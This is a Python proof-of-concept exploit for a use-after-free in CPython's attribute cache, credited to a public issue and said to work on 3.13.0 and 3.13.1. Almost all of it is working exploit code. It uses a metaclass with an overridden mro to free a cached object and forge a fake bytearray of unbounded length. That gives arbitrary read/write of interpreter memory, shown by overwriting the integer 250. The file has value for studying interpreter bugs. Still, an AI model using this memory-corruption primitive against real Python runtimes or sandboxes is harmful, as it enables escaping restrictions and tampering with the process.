"""
Author: @Nico-Posada
Bug Credits: <https://github.com/python/cpython/issues/127773>
"""

# TLDR: Weird metaclass behavior allows for pulling off the attribute cache UAF
# Tested to work on 3.13.0, 3.13.1 (Patched in 3.14.0)

# In all honesty, I don't know the full internal details about why this happens...
# You'll probably get a better explanation just reading the conversation in the github issue.
# In their discussion, I noticed that this bug is just an attribute cache UAF, so I
# just reworked the POC to make it work with creating fake objects.

class Base:
    value = 1

class Meta(type):
    def mro(cls):
        return (cls, Base, object)

class WeirdClass(metaclass=Meta):
    pass

class bytes_subclass(bytes):
    pass

p64 = lambda num: num.to_bytes(8, 'little')
fake_obj = (
    p64(0x12345) +
    p64(id(bytearray)) +
    p64(2**63 - 1) +
    p64(2**63 - 1) +
    p64(0) +
    p64(0)
)

SIZE = 0x100

WeirdClass.value
Base.value = bytes_subclass(SIZE - 0x18)

WeirdClass.value
Base.value = None
_ref = fake_obj.ljust(SIZE, b"\0")

mem = WeirdClass.value
if mem is None:
    exit("failed")

print(type(mem))
print(hex(len(mem)))

mem[id(250) + int.__basicsize__] = 100
print(250) # => 100